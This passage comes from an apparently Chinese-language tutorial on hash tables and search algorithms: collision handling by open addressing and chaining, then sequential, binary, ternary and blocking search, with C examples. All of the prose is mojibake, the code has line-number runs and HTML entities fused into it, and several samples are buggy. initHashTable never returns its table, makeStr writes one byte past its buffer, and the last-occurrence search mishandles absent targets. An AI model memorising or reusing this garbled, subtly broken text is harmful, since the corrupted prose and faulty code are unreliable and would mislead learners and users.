å–çš„ä½™æ•°ç›´æ¥åšä¸ºå­˜å‚¨åœ°å€ã€‚ä¸€èˆ¬é€‰æ‹©ä¸å¤§äº p çš„æœ€å¤§è´¨æ•°ã€‚ å­—ç¬¦ä¸²hashçš„ BKD hashã€‚ ... hashå‡½æ•°è®¾è®¡è¦æ±‚è®¡ç®—ç®€å•ï¼Œå€¼å°½é‡å‡åŒ€åˆ†å¸ƒã€‚ å†²çªå¤„ç† å¼€æ”¾åœ°å€æ³• å¦‚æœå‘ç”Ÿå†²çªï¼Œé‚£ä¹ˆå°±ä½¿ç”¨æŸç§ç­–ç•¥å¯»æ‰¾ä¸‹ä¸€å­˜å‚¨åœ°å€ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªä¸å†²çªçš„åœ°å€æˆ–è€…æ‰¾åˆ°å…³é”®å­—ï¼Œå¦åˆ™ä¸€ç›´æŒ‰è¿™ç§ç­–ç•¥ç»§ç»­å¯»æ‰¾ã€‚å¦‚æœå†²çªæ¬¡æ•°è¾¾åˆ°äº†ä¸Šé™åˆ™ç»ˆæ­¢ç¨‹åºï¼Œè¡¨ç¤ºå…³é”®å­—ä¸å­˜åœ¨å“ˆå¸Œè¡¨é‡Œã€‚ çº¿æ€§æ¢æµ‹æ³•ï¼Œå¦‚æœå½“å‰çš„å†²çªä½ç½®ä¸º \\(d\\)ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å‡ ä¸ªæ¢æµ‹åœ°å€ä¸º \\(d + 1\\)ï¼Œ\\(d + 2\\)ï¼Œ\\(d + 3\\) ç­‰ï¼Œä¹Ÿå°±æ˜¯ä»å†²çªåœ°å€å¾€åé¢ä¸€ä¸ªä¸€ä¸ªæ¢æµ‹ï¼› çº¿æ€§è¡¥å¿æ¢æµ‹æ³•ï¼Œå®ƒå½¢æˆçš„æ¢æµ‹åœ°å€ä¸º \\(d + m\\)ï¼Œ\\(d + 2 \\times m\\)ï¼Œ\\(d + 3 \\times m\\) ç­‰ï¼Œä¸çº¿æ€§æ¢æµ‹æ³•ä¸åŒï¼Œè¿™é‡Œçš„æŸ¥æ‰¾å•ä½ä¸æ˜¯ \\(1\\)ï¼Œè€Œæ˜¯ \\(m\\)ï¼Œä¸ºäº†èƒ½éå†åˆ°å“ˆå¸Œè¡¨é‡Œæ‰€æœ‰ä½ç½®ï¼Œè®¾ç½® \\(m\\) å’Œè¡¨é•¿ \\(size\\) äº’è´¨ï¼› éšæœºæ¢æµ‹æ³•ï¼Œè¿™ç§æ–¹æ³•å’Œå‰ä¸¤ç§æ–¹æ³•ç±»ä¼¼ï¼Œè¿™é‡Œçš„æŸ¥æ‰¾å•ä½ä¸æ˜¯ä¸€ä¸ªå›ºå®šå€¼ï¼Œè€Œæ˜¯ä¸€ä¸ªéšæœºåºåˆ—ã€‚ äºŒæ¬¡æ¢æµ‹æ³•ï¼Œå®ƒå½¢æˆçš„æ¢æµ‹åœ°å€ä¸º \\(d + 1^2\\)ï¼Œ\\(d - 1^2\\)ï¼Œ\\(d + 2^2\\)ï¼Œ\\(d - 2^2\\) ç­‰ï¼Œè¿™ç§æ–¹æ³•åœ¨å†²çªä½ç½®å·¦å³è·³è·ƒç€å¯»æ‰¾æ¢æµ‹åœ°å€ã€‚ è§„å®šï¼Œå½“å†²çªæ¬¡æ•°å°äºè¡¨é•¿çš„ä¸€åŠæ—¶ï¼Œå°±å¯ä»¥æŠŠå­—ç¬¦ä¸²æ’å…¥åˆ°å“ˆå¸Œè¡¨ä¸­ã€‚è€Œå¦‚æœå‘ç”Ÿå†²çªæ¬¡æ•°å¤§äºè¡¨é•¿çš„ä¸€åŠæ—¶ï¼Œå°±éœ€è¦è°ƒç”¨é‡å»ºå‡½æ•°å»é‡å»ºå“ˆå¸Œè¡¨äº†ï¼Œå› ä¸ºè®¤ä¸ºå“ˆå¸Œè¡¨å·²ç»å‘ç”Ÿäº†â€œå †èšâ€ç°è±¡ï¼Œè¿™ç§æƒ…å†µä¸‹è¦æ‰©å¤§å“ˆå¸Œè¡¨çš„å®¹é‡ï¼Œæé«˜æŸ¥æ‰¾å’Œæ’å…¥çš„æ•ˆç‡ã€‚ å¼€æ”¾åœ°å€æ³•è®¡ç®—ç®€å•å¿«æ·ï¼Œå¤„ç†èµ·æ¥æ–¹ä¾¿ï¼Œä½†æ˜¯ä¹Ÿå­˜åœ¨ä¸å°‘ç¼ºç‚¹ã€‚ çº¿æ€§æ¢æµ‹æ³•å®¹æ˜“å½¢æˆâ€œå †èšâ€çš„æƒ…å†µï¼Œå³å¾ˆå¤šè®°å½•å°±è¿åœ¨ä¸€å—ï¼Œè€Œä¸”ä¸€æ—¦å½¢æˆâ€œå †èšâ€ï¼Œè®°å½•ä¼šè¶Šèšè¶Šå¤šã€‚ å¦å¤–ï¼Œå¼€æ”¾åœ°å€æ³•éƒ½æœ‰ä¸€ä¸ªç¼ºç‚¹ï¼Œåˆ é™¤æ“ä½œæ˜¾å¾—ååˆ†å¤æ‚ï¼Œä¸èƒ½ç›´æ¥åˆ é™¤å…³é”®å­—æ‰€åœ¨çš„è®°å½•ï¼Œå¦åˆ™åœ¨æŸ¥æ‰¾åˆ é™¤ä½ç½®åé¢çš„å…ƒç´ æ—¶ï¼Œå¯èƒ½ä¼šå‡ºç°æ‰¾ä¸åˆ°çš„æƒ…å†µï¼Œå› ä¸ºåˆ é™¤ä½ç½®ä¸Šå·²ç»æˆäº†ç©ºåœ°å€ï¼ŒæŸ¥æ‰¾åˆ°è¿™é‡Œæ—¶ä¼šç»ˆæ­¢æŸ¥æ‰¾ã€‚ é“¾åœ°å€æ³• è¯¥æ–¹æ³•å°†æ‰€æœ‰å“ˆå¸Œåœ°å€ç›¸åŒçš„ç»“ç‚¹æ„æˆä¸€ä¸ªå•é“¾è¡¨ï¼Œå•é“¾è¡¨çš„å¤´ç»“ç‚¹å­˜åœ¨å“ˆå¸Œæ•°ç»„é‡Œã€‚é“¾åœ°å€æ³•å¸¸å‡ºç°åœ¨ç»å¸¸æ’å…¥å’Œåˆ é™¤çš„æƒ…å†µä¸‹ã€‚ ç›¸æ¯”å¼€æ”¾åœ°å€æ³•ï¼Œé“¾åœ°å€æ³•æœ‰ä»¥ä¸‹ä¼˜ç‚¹ï¼šä¸ä¼šå‡ºç°â€œå †èšâ€ç°è±¡ï¼Œå“ˆå¸Œåœ°å€ä¸åŒçš„å…³é”®å­—ä¸ä¼šå‘ç”Ÿå†²çªï¼›ä¸éœ€è¦é‡å»ºå“ˆå¸Œè¡¨ï¼Œåœ¨å¼€æ”¾åœ°å€æ³•ä¸­ï¼Œå¦‚æœå“ˆå¸Œè¡¨é‡Œå­˜æ»¡å…³é”®å­—äº†å°±éœ€è¦æ‰©å……å“ˆå¸Œè¡¨ç„¶åé‡å»ºå“ˆå¸Œè¡¨ï¼Œè€Œåœ¨é“¾åœ°å€æ³•é‡Œï¼Œå› ä¸ºç»“ç‚¹éƒ½æ˜¯åŠ¨æ€ç”³è¯·çš„ï¼Œæ‰€ä»¥ä¸ä¼šå‡ºç°å“ˆå¸Œè¡¨é‡Œå­˜æ»¡å…³é”®å­—çš„æƒ…å†µï¼›ç›¸æ¯”å¼€æ”¾åœ°å€æ³•ï¼Œå…³é”®å­—åˆ é™¤æ›´æ–¹ä¾¿ï¼Œåªéœ€è¦æ‰¾åˆ°æŒ‡å®šç»“ç‚¹ï¼Œåˆ é™¤è¯¥ç»“ç‚¹å³å¯ã€‚ å½“ç„¶ä»£ä»·å°±æ˜¯æŸ¥æ‰¾æ•ˆç‡ä¼šç¨ä½ä¸€ç‚¹ï¼Œä½†æ˜¯å¯¹äºhashæ¥è®²è¿™ä¸€ç‚¹æ•ˆç‡å½±å“åœ¨å¤§å¤šæ•°éæç«¯æ¡ä»¶ä¸‹ï¼Œä½¿ç”¨ä½“éªŒåŸºæœ¬æ²¡æœ‰å•¥åŒºåˆ«ã€‚ å½“å…³é”®å­—è§„æ¨¡å°‘çš„æ—¶å€™ï¼Œå¼€æ”¾åœ°å€æ³•æ¯”é“¾åœ°å€æ³•æ›´èŠ‚çœç©ºé—´ï¼Œå› ä¸ºç”¨é“¾åœ°å€æ³•å¯èƒ½ä¼šå­˜åœ¨å“ˆå¸Œæ•°ç»„å‡ºç°å¤§é‡ç©ºåœ°å€çš„æƒ…å†µï¼Œè€Œåœ¨å…³é”®å­—è§„æ¨¡å¤§çš„æƒ…å†µä¸‹ï¼Œé“¾åœ°å€æ³•å°±æ¯”å¼€æ”¾åœ°å€æ³•æ›´èŠ‚çœç©ºé—´ï¼Œé“¾è¡¨äº§ç”Ÿçš„æŒ‡é’ˆåŸŸå¯ä»¥å¿½ç•¥ä¸è®¡ï¼Œå…³é”®å­—å¤šï¼Œå“ˆå¸Œæ•°ç»„é‡Œäº§ç”Ÿçš„ç©ºåœ°å€å°±å°‘äº†ã€‚ å®ç°çº¿æ€§æ¢æµ‹æ³•hash 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;typedef struct HashTable &#123; char **elem; int size;&#125; HashTable;void init(HashTable *h);int hash(HashTable *h, char value[]);int search(HashTable *h, char value[], int *pos, int *times);int insert(HashTable *h, char value[]);void recreate(HashTable *h);void init(HashTable *h) &#123; h-&gt;size = 2000; h-&gt;elem = (char **)malloc(sizeof(char *) * h-&gt;size); for (int i = 0; i &lt; h-&gt;size; i++) &#123; h-&gt;elem[i] = NULL; &#125;&#125;int hash(HashTable *h, char value[]) &#123; int code = 0; for (size_t i = 0; i &lt; strlen(value); i++) &#123; code = (code * 256 + value[i] + 128) % h-&gt;size; &#125; return code;&#125;int search(HashTable *h, char value[], int *pos, int *times) &#123; *pos = hash(h, value); *times = 0; while (h-&gt;elem[*pos] != NULL &amp;&amp; strcmp(h-&gt;elem[*pos], value) != 0) &#123; (*times)++; if (*times &lt; h-&gt;size) &#123; *pos = (*pos + 1) % h-&gt;size; &#125; else &#123; return 0; &#125; &#125; if (h-&gt;elem[*pos] != NULL &amp;&amp; strcmp(h-&gt;elem[*pos], value) == 0) &#123; return 1; &#125; else &#123; return 0; &#125;&#125;int insert(HashTable *h, char value[]) &#123; int pos, times; // posåœ¨searchå‡½æ•°ç»“æŸæ—¶æ—¶å¾…æ’å…¥å…ƒç´ çš„ä½ç½®ï¼Œtimesä¸ºå†²çªè®¡æ•° if (search(h, value, &amp;pos, &amp;times)) &#123; return 2; &#125; else if (times &lt; h-&gt;size / 2) &#123; h-&gt;elem[pos] = (char *)malloc(strlen(value) + 1); strcpy(h-&gt;elem[pos], value); return 1; &#125; else &#123; recreate(h); insert(h, value); return 0; &#125;&#125;// å½“æ’å…¥å€¼çš„å†²çªæ•°å¤§äºsizeçš„ä¸€åŠæ—¶ï¼Œå¢å¤§å“ˆå¸Œè¡¨ã€‚void recreate(HashTable *h) &#123; // è·å–åŸå“ˆå¸Œè¡¨ä¸­å…ƒç´  char **temp_elem; temp_elem = (char **)malloc(sizeof(char *) * h-&gt;size); for (int i = 0; i &lt; h-&gt;size; i++) &#123; if (h-&gt;elem[i] != NULL) &#123; temp_elem[i] = (char *)malloc(strlen(h-&gt;elem[i]) + 1); strcpy(temp_elem[i], h-&gt;elem[i]); &#125; else &#123; temp_elem[i] = NULL; &#125; &#125; // é‡Šæ”¾åŸå“ˆå¸Œè¡¨ä¸­å…ƒç´  for (int i = 0; i &lt; h-&gt;size; i++) &#123; if (h-&gt;elem[i] != NULL) &#123; free(h-&gt;elem[i]); &#125; &#125; free(h-&gt;elem); // åˆ›å»ºæ–°å“ˆå¸Œè¡¨ int copy_size = h-&gt;size; h-&gt;size = h-&gt;size * 2; h-&gt;elem = (char **)malloc(sizeof(char *) * h-&gt;size); for (int i = 0; i &lt; h-&gt;size; i++) &#123; h-&gt;elem[i] = NULL; &#125; for (int i = 0; i &lt; copy_size; i++) &#123; if (temp_elem[i] != NULL) &#123; insert(h, temp_elem[i]); &#125; &#125; // é‡Šæ”¾å†…å­˜ for (int i = 0; i &lt; copy_size; i++) &#123; if (temp_elem[i] != NULL) &#123; free(temp_elem[i]); &#125; &#125; free(temp_elem);&#125;void clear(HashTable *h) &#123; for (int i = 0; i &lt; h-&gt;size; ++i) &#123; if (h-&gt;elem[i] != NULL) &#123; free(h-&gt;elem[i]); &#125; &#125; free(h-&gt;elem); free(h);&#125;int main() &#123; HashTable *hashtable = (HashTable*)malloc(sizeof(HashTable)); init(hashtable); char buffer[1000]; int n; scanf(\"%d\", &amp;n); for (int i = 1; i &lt;= n; i++) &#123; scanf(\"%s\", buffer); int ans = insert(hashtable, buffer); if (ans == 0) &#123; printf(\"recreate while insert!\\n\"); &#125; else if (ans == 1) &#123; printf(\"insert success!\\n\"); &#125; else if (ans == 2) &#123; printf(\"It already exists!\\n\"); &#125; &#125; int temp_pos, temp_times; scanf(\"%s\", buffer); if (search(hashtable, buffer, &amp;temp_pos, &amp;temp_times)) &#123; printf(\"search success!\\n\"); &#125; else &#123; printf(\"search failed!\\n\"); &#125; clear(hashtable); return 0;&#125; å®ç°é“¾åœ°å€æ³• 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;time.h&gt;typedef struct Node &#123; char *str; struct Node *next;&#125; Node;typedef struct HashTable &#123; Node **data; int size;&#125; HashTable;Node *initNode(const char *str) &#123; Node *n = (Node *)malloc(sizeof(Node)); //n-&gt;str = (char *)malloc(strlen(str) + 1); //strcpy(n-&gt;str, str); // ç­‰ä»·æ“ä½œ n-&gt;str = strdup(str); n-&gt;next = NULL; return n;&#125;void freeNode(Node *n) &#123; if (!n) return; free(n-&gt;str); free(n); return;&#125;void freeList(Node *list) &#123; if (!list) return; Node *n; while (list) &#123; n = list; list = list-&gt;next; freeNode(n); &#125; return;&#125;HashTable *initHashTable(int size) &#123; HashTable *h = (HashTable *)malloc(sizeof(HashTable)); h-&gt;size = 2 * size; h-&gt;data = (Node **)calloc(h-&gt;size, sizeof(Node*));&#125;void freeHashTable(HashTable *h) &#123; if (!h) return; for (int i = 0; i &lt; h-&gt;size; i++) &#123; freeList(h-&gt;data[i]); &#125; free(h-&gt;data); free(h); return;&#125;Node *insertNode(Node *head, Node *p) &#123; p-&gt;next = head; return p;&#125;int BKDHash(const char *str) &#123; int seed = 11; // prime int hash = 0; while (*str) &#123; hash = hash * seed + str[0]; ++str; &#125; return hash &amp; 0x7fffffff;&#125;int insertHash(HashTable *h, const char *str) &#123; if (h == NULL) return 0; int hash = BKDHash(str); int idx = hash % h-&gt;size; h-&gt;data[idx] = insertNode(h-&gt;data[idx], initNode(str)); return 1;&#125;Node *searchList(Node *p, const char *str) &#123; while (p &amp;&amp; strcmp(p-&gt;str, str)) &#123; p = p-&gt;next; &#125; return p;&#125;Node *search(HashTable *h, const char *str) &#123; if (h == NULL) return NULL; int hash = BKDHash(str); int idx = hash % h-&gt;size; return searchList(h-&gt;data[idx], str);&#125;char *makeStr(char *str, int n) &#123; int len = rand() % (n - 1) + 1; char tmp; for (int i = 0; i &lt; len; i++) &#123; switch (rand() % 3) &#123; case 0: tmp = 'A' + rand() % 26; break; case 1: tmp = 'a' + rand() % 26; break; case 2: tmp = '0' + rand() % 10; break; &#125; str[i] = tmp; &#125; str[n] = '\\0'; // or str[n] = 0; return str;&#125;int main(void) &#123; srand(time(NULL)); #define N 10 char str[10]; int cnt = N; HashTable *h = initHashTable(N); while (cnt--) &#123; insertHash(h, makeStr(str, 10)); printf(\"%s \", str); &#125; putchar(10); // or putchar('\\n'); while (~scanf(\"%s\", str)) &#123; if (!strcmp(str, \"q\")) break; // q é€€å‡º Node *node = search(h, str); if (node) printf(\"hash=%d addr=%p str=%s\\n\", BKDHash(str), node, node-&gt;str); else printf(\"%s not found\\n\", str); &#125; #undef N return 0;&#125; æŸ¥æ‰¾è¡¨ ç”¨äºæŸ¥æ‰¾çš„æ•°æ®é›†åˆåˆ™ç§°ä¸º æŸ¥æ‰¾è¡¨ï¼ˆsearch tableï¼‰ ã€‚æŸ¥æ‰¾è¡¨ä¸­çš„æ•°æ®å…ƒç´ ç±»å‹æ˜¯ä¸€è‡´çš„ï¼Œå¹¶ä¸”æœ‰èƒ½å¤Ÿå”¯ä¸€æ ‡è¯†å‡ºå…ƒç´ çš„ å…³é”®å­—ï¼ˆkeywordï¼‰ ã€‚ é€šå¸¸å¯¹æŸ¥æ‰¾è¡¨æœ‰ 4 ç§æ“ä½œï¼š æŸ¥æ‰¾ï¼šåœ¨æŸ¥æ‰¾è¡¨ä¸­æŸ¥çœ‹æŸä¸ªç‰¹å®šçš„è®°å½•æ˜¯å¦å­˜åœ¨ æ£€ç´¢ï¼šæŸ¥æ‰¾æŸä¸ªç‰¹å®šè®°å½•çš„å„ç§å±æ€§ æ’å…¥ï¼šå°†æŸä¸ªä¸å­˜åœ¨çš„æ•°æ®å…ƒç´ æ’å…¥åˆ°æŸ¥æ‰¾è¡¨ä¸­ åˆ é™¤ï¼šä»æŸ¥æ‰¾è¡¨ä¸­åˆ é™¤æŸä¸ªç‰¹å®šå…ƒç´  å¦‚æœå¯¹æŸ¥æ‰¾è¡¨åªæ‰§è¡Œå‰ä¸¤ç§æ“ä½œï¼Œåˆ™ç§°è¿™ç±»æŸ¥æ‰¾è¡¨ä¸º é™æ€æŸ¥æ‰¾è¡¨ï¼ˆstatic search tableï¼‰ ã€‚é™æ€æŸ¥æ‰¾è¡¨å»ºç«‹ä»¥åï¼Œå°±ä¸èƒ½å†æ‰§è¡Œæ’å…¥æˆ–åˆ é™¤æ“ä½œï¼ŒæŸ¥æ‰¾è¡¨ä¹Ÿä¸å†å‘ç”Ÿå˜åŒ–ã€‚æ¯”å¦‚é¡ºåºæŸ¥æ‰¾ã€æŠ˜åŠæŸ¥æ‰¾ã€åˆ†å—æŸ¥æ‰¾ç­‰ã€‚ å¯¹åº”çš„ï¼Œå¦‚æœå¯¹æŸ¥æ‰¾è¡¨è¿˜è¦æ‰§è¡Œåä¸¤ç§æ“ä½œï¼Œåˆ™ç§°è¿™ç±»æŸ¥æ‰¾è¡¨ä¸º åŠ¨æ€æŸ¥æ‰¾è¡¨ï¼ˆdynamic search tableï¼‰ ã€‚å¯¹äºåŠ¨æ€æŸ¥æ‰¾è¡¨ï¼Œå¾€å¾€ä½¿ç”¨äºŒå‰å¹³è¡¡æ ‘ã€B-æ ‘æˆ–å“ˆå¸Œè¡¨æ¥å¤„ç†ã€‚ æ€§èƒ½åº¦é‡ ä½¿ç”¨ å¹³å‡æŸ¥æ‰¾é•¿åº¦ï¼ˆaverage search length, ASLï¼‰ æ¥è¡¡é‡æŸ¥æ‰¾ç®—æ³•çš„æ€§èƒ½ã€‚ å‡è®¾æ¯ä¸ªå…ƒç´ æ—¶ç­‰æ¦‚ç‡åˆ†å¸ƒï¼ŒASLå°±æ˜¯æ‰€æœ‰å…ƒç´ è¢«æˆåŠŸæŸ¥æ‰¾æ—¶ï¼Œå…ƒç´ æ¯”è¾ƒæ¬¡æ•°çš„æœŸæœ›ã€‚ é€šå¸¸å¹³å‡æŸ¥æ‰¾é•¿åº¦ï¼Œä¸è€ƒè™‘æŸ¥æ‰¾ä¸æˆåŠŸçš„æƒ…å†µã€‚ é¡ºåºæŸ¥æ‰¾ é¡ºåºæŸ¥æ‰¾ï¼ˆåˆç§°çº¿æ€§æŸ¥æ‰¾ï¼Œsequential searchï¼‰ æ˜¯æŒ‡åœ¨çº¿æ€§è¡¨ä¸­è¿›è¡Œçš„æŸ¥æ‰¾ç®—æ³•ã€‚å¯¹äºæ— åºåºåˆ—ï¼ŒæŸ¥æ‰¾æˆåŠŸçš„ASLä¸º \\(\\frac{n+1}{2}\\)ã€‚æŸ¥æ‰¾ä¸æˆåŠŸASLä¸º nã€‚ å¯¹äºæœ‰åºåºåˆ—ï¼ŒæŸ¥æ‰¾æˆåŠŸçš„ASLä¸º \\(\\frac{n+1}{2}\\)ã€‚æŸ¥æ‰¾ä¸æˆåŠŸASLä¸º \\(\\frac{n}{2} +\\frac{n}{n+1}\\)ã€‚ 12345678910111213141516171819#include &lt;stdio.h&gt;int search(int *data, int length, int value) &#123; for (int i = 0; i &lt; length; ++i) &#123; if (data[i] == value) &#123; return i; &#125; else if (data[i] &gt; value) &#123; return -1; &#125; &#125; return -1;&#125;int main() &#123; int a[5] = &#123;2, 4, 6, 8, 10&#125;; printf(\"%d\\n\", search(a, 5, 4)); printf(\"%d\\n\", search(a, 5, 5)); return 0;&#125; æŠ˜åŠæŸ¥æ‰¾ é’ˆå¯¹æœ‰åºå¯éšæœºå¯»å€çš„é¡ºåºè¡¨ç»“æ„ï¼ŒæŸ¥æ‰¾æ—¶é—´å¤æ‚åº¦ç¨³å®šä¸‹é™ä¸º \\(O(log(n))\\) çº§åˆ«ã€‚ åœ¨å®šä¹‰ç«¯ç‚¹ä¸‹æ ‡æ—¶ï¼Œå†³å®šäº†æœç´¢åŒºé—´çš„åˆ†å¸ƒæƒ…å†µã€‚å³ç«¯å®šä¹‰ä¸ºlength - 1ï¼Œæœç´¢åŒºé—´ä¸ºé—­åŒºé—´ã€‚å³ç«¯æ”¶ç¼©ä¸º mid - 1ã€‚å³ç«¯å®šä¹‰ä¸ºlengthï¼Œæœç´¢åŒºé—´ä¸ºå·¦é—­å³å¼€ï¼Œå³ç«¯æ”¶ç¼©ä¸º midã€‚ 1234567891011121314151617181920212223#include &lt;stdio.h&gt;int search(int *data, int length, int value) &#123; int left = 0, right = length - 1; while (left &lt;= right) &#123; int mid = (left + right) / 2; if (data[mid] == value) &#123; return mid; &#125; else if (data[mid] &lt; value) &#123; left = mid + 1; &#125; else &#123; right = mid - 1; &#125; &#125; return -1;&#125;int main() &#123; int a[5] = &#123;2, 4, 6, 8, 10&#125;; printf(\"%d\\n\", search(a, 5, 10)); printf(\"%d\\n\", search(a, 5, 5)); return 0;&#125; æœç´¢æ’å¥½åºçš„åºåˆ—ä¸­æŸé‡å¤å…ƒç´ ç¬¬ä¸€ä¸ªå‡ºç°ä½ç½®çš„é—®é¢˜ã€‚ 123456789101112int search(int *data, int length, int value) &#123; int left = 0, right = length; // å¤„ç†ä¸å­˜åœ¨ç›®æ ‡æƒ…å†µ while (left &lt; right) &#123; int mid = (left + right) / 2; if (data[mid] == value) &#123; right = mid; // æ”¶ç¼©åˆ°ç¬¬ä¸€ä¸ªå‡ºç°ä½ç½® &#125; else &#123; left = mid + 1; &#125; &#125; return right != length ? left : -1; // å¤„ç†ä¸å­˜åœ¨ç›®æ ‡æƒ…å†µ&#125; æœç´¢æ’å¥½åºçš„åºåˆ—ä¸­æŸé‡å¤å…ƒç´ æœ€åä¸€ä¸ªå‡ºç°ä½ç½®çš„é—®é¢˜ã€‚ 123456789101112int search(int *data, int length, int value) &#123; int left = -1, right = length - 1; // left = -1 å¤„ç†ä¸å­˜åœ¨ç›®æ ‡æƒ…å†µ while (left &lt; right) &#123; int mid = (left + right + 1) / 2; // ä¿è¯leftä¸ä¼šæ’å®šä¸ºä¸€ä¸ªå€¼ï¼Œæ‰€ä»¥ + 1 if (data[mid] == value) &#123; left = mid; // æ”¶ç¼©åˆ°ç¬¬ä¸€ä¸ªå‡ºç°ä½ç½® &#125; else &#123; right = mid - 1; &#125; &#125; return left; // ä¸å­˜åœ¨è¿”å› -1&#125; ä¸‰åˆ†æŸ¥æ‰¾ é€‚åˆåºåˆ—å…·æœ‰å‡¸æ€§çš„æƒ…å†µï¼ŒæŸä¸€ç‚¹ä¸¤ä¾§åˆ†åˆ«æ˜¯å•è°ƒçš„ã€‚ é¦–å…ˆå°†åŒºé—´ \\([L, R]\\) å¹³å‡åˆ†æˆä¸‰éƒ¨åˆ†ï¼š\\([L, m_1]\\)ã€\\([m_1, m_2]\\)ã€\\([m_2, R]\\)ã€‚ è®¡ç®—ä¸‰ç­‰åˆ†ç‚¹ \\(m_1\\) å’Œ \\(m_2\\) å¯¹åº”çš„å‡½æ•°å€¼ \\(f(m_1)\\) å’Œ \\(f(m_2)\\)ã€‚ æ¯”è¾ƒ \\(f(m_1)\\) å’Œ \\(f(m_2)\\) çš„å¤§å°ã€‚ å¦‚æœ \\(f(m_1) &gt; f(m_2)\\)ï¼Œåˆ™è¯´æ˜ç‚¹ \\(T\\) ä¸€å®šä¸åœ¨åŒºé—´ \\([m_2, R]\\) å†…ï¼Œå¯ä»¥æŠŠå³è¾¹ç•Œ \\(R\\) æ›´æ–°æˆ \\(m_2\\)ï¼› å¦‚æœ \\(f(m_1) &lt; f(m_2)\\)ï¼Œåˆ™è¯´æ˜ç‚¹ \\(T\\) ä¸€å®šä¸åœ¨åŒºé—´ \\([L, m_1]\\) å†…ï¼Œå¯ä»¥æŠŠå·¦è¾¹ç•Œ \\(L\\) æ›´æ–°æˆ \\(m_1\\)ï¼› å¦‚æœ \\(f(m_1) = f(m_2)\\)ï¼Œåˆ™è¯´æ˜ç‚¹ \\(T\\) ä¸€å®šè½åœ¨åŒºé—´ \\([m_1, m_2]\\) å†…ã€‚å¦å¤–ï¼Œå¯ä»¥å°†è¿™ç§æƒ…å†µå½’ä¸ºä¸Šé¢ä¸¤ç§æƒ…å†µçš„ä»»ä¸€ä¸€ç§ã€‚ é‡å¤ä»¥ä¸Šæ“ä½œï¼Œä¸æ–­ç¼©å°æŸ¥æ‰¾åŒºé—´ï¼Œç›´åˆ°åœ¨ç²¾åº¦è¦æ±‚çš„èŒƒå›´å†…ï¼Œå·¦è¾¹ç•Œ \\(L\\) ç­‰äºå³è¾¹ç•Œ \\(R\\)ï¼Œè¿™æ—¶çš„è¾¹ç•Œç‚¹ \\((L, f(L))\\) æˆ–è€… \\((R, f(R))\\) å³æ˜¯æŸ¥æ‰¾çš„æå¤§å€¼ç‚¹ \\(T\\)ã€‚ åŒç†ï¼Œå¦‚æœæ±‚å‡¹æ€§å‡½æ•°çš„æå°å€¼ç‚¹ï¼Œåªéœ€è¦åœ¨ç¬¬ä¸‰æ­¥ä¸­ï¼Œå°†å¤§äºå·å’Œå°äºå·åå‘å˜åŒ–ä¸€ä¸‹å³å¯ã€‚ 12345678910111213141516171819202122232425#include &lt;stdio.h&gt;int find_max(int *data, int length) &#123; int left = 0, right = length - 1; while (right - left &gt;= 2) &#123; int m1 = left + (right - left) / 3; int m2 = right - (right - left + 2) / 3; if (data[m1] &gt;= data[m2]) &#123; right = m2; &#125; else &#123; left = m1 + 1; &#125; &#125; if (data[left] &gt; data[right]) &#123; return left; &#125; else &#123; return right; &#125;&#125;int main() &#123; int a[5] = &#123;1, 2, 7, 5, 4&#125;; printf(\"%d\\n\", find_max(a, 5)); return 0;&#125; åˆ†å—æŸ¥æ‰¾ åˆ†å—æŸ¥æ‰¾ï¼ˆBlocking Searchï¼‰çš„åŸºæœ¬æ€æƒ³æ˜¯å°†ä¸€ä¸ªçº¿æ€§è¡¨åˆ†æˆè‹¥å¹²ä¸ªå­è¡¨ï¼Œåœ¨æŸ¥æ‰¾æ—¶ï¼Œå…ˆç¡®å®šç›®æ ‡å…ƒç´ æ‰€åœ¨çš„å­è¡¨å†åœ¨è¯¥å­è¡¨ä¸­å»æŸ¥æ‰¾å®ƒã€‚ åˆ†å—æŸ¥æ‰¾ä¹Ÿè¢«å«åš ç´¢å¼•é¡ºåºæŸ¥æ‰¾ ï¼Œåœ¨åˆ†å—æŸ¥æ‰¾æ–¹æ³•ä¸­ï¼Œéœ€è¦å»ºç«‹ä¸€ä¸ª ç´¢å¼•è¡¨ ã€‚ç´¢å¼•è¡¨ä¸­åŒ…å«ä¸¤ç±»ä¿¡æ¯ï¼šå…³é”®å­—å’ŒæŒ‡é’ˆã€‚å…³é”®å­—æŒ‡çš„æ¯ä¸ªå­è¡¨ä¸­æœ€å¤§çš„å…³é”®å­—ï¼ŒæŒ‡é’ˆåˆ™è¡¨ç¤ºè¯¥å­è¡¨ä¸­ç¬¬ä¸€ä¸ªå…ƒç´ åœ¨æ•´ä¸ªè¡¨ä¸­çš„ä¸‹æ ‡ã€‚ åˆ†å—æŸ¥æ‰¾è¦æ±‚æ•´ä¸ªçº¿æ€§è¡¨æ˜¯åˆ†å—æœ‰åºçš„ã€‚ç¬¬ i ä¸ªå­è¡¨ä¸­æœ€å¤§çš„å…³é”®å­—å°äºç¬¬ i+1 ä¸ªå­è¡¨ä¸­æœ€å°çš„å…³é”®å­—ã€‚ è€Œåœ¨æ¯ä¸€ä¸ªå­è¡¨ä¸­ï¼Œå…ƒç´ çš„æ’åˆ—æ˜¯éšæ„çš„ï¼Œåªèƒ½é€šè¿‡é¡ºåºæŸ¥æ‰¾çš„æ–¹æ³•åœ¨å­è¡¨ä¸­å®Œæˆæœ€ç»ˆçš„æŸ¥æ‰¾å·¥ä½œã€‚ åˆ†å—æŸ¥æ‰¾çš„æ•ˆç‡æ˜¯åŸºäºé¡ºåºæŸ¥æ‰¾å’ŒæŠ˜åŠæŸ¥æ‰¾ä¹‹é—´çš„ã€‚å…ˆæœç´¢å¼•ï¼Œå†é¡ºåºæœç´¢å­è¡¨ã€‚ åˆ†å—æŸ¥æ‰¾çš„ä¼˜åŠ¿åœ¨äºï¼Œç”±äºå­å—ä¸­çš„å…ƒç´ 